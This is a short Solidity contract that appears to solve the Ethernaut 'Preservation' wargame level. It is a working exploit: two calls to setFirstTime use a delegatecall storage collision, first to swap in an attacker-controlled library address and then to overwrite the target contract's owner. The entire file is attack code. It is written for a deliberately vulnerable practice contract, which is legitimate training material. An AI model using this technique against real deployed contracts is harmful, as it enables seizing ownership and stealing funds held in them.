// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Preservation.sol";

contract PreservationHelper {
  Preservation preservationInst;
  constructor(address presevationAddr) public {
    preservationInst = Preservation(presevationAddr);
  }

  function step1(address fakeLibraryAddr) public {
    // will replace timeZone1Library variable in Preservation contract to fakeLibraryAddresss
    preservationInst.setFirstTime(uint256(uint160(fakeLibraryAddr)));
  }

  function step2(address targetOwnerAddr) public {
    // will call the fakeLibrary and replace the owner variable in Preservation contract
    // Please notice that if this step show tx success but does not take affect, it may be run out of gas when executing setFirstTime
    preservationInst.setFirstTime(uint256(uint160(targetOwnerAddr)));
  }
}